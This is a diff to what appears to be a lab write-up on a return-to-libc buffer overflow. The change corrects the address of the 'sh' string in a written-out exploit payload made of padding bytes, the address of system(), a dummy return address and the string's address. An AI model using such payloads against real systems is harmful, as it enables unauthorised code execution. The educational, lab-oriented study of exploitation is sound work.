@@ -197,7 +197,7 @@ But do to the way these are pushed onto the stack, we need to reverse them and i
 ```12345678123456781234``` + the shellcode for system() +```\x90\x61\xe5\xb7``` + ```a dumb return address``` + the location for ```sh``` ```\x11\xde\xff\xb7``` 
 
 
-or in total ```12345678123456781234\x90\x61\xe5\xb7RETA\xf5\x40\xf7\xb7```
+or in total ```12345678123456781234\x90\x61\xe5\xb7RETA\x11\xde\xff\xb7```
 
 # Task 2:
 
